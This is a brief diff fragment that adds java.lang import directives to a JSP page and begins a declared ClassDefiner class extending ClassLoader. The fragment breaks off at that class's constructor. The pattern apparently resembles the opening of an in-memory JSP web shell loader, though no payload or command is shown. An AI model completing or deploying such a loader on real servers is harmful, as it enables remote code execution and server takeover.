@@ -1,3 +1,10 @@
+<%@ page import="java.lang.Class" %>
+<%@ page import="java.lang.ClassLoader" %>
+<%@ page import="java.lang.Exception" %>
+<%@ page import="java.lang.Object" %>
+<%@ page import="java.lang.Override" %>
+<%@ page import="java.lang.String" %>
+<%@ page import="java.lang.Thread" %>
 <%!
     public static class ClassDefiner extends ClassLoader {
         public ClassDefiner() {
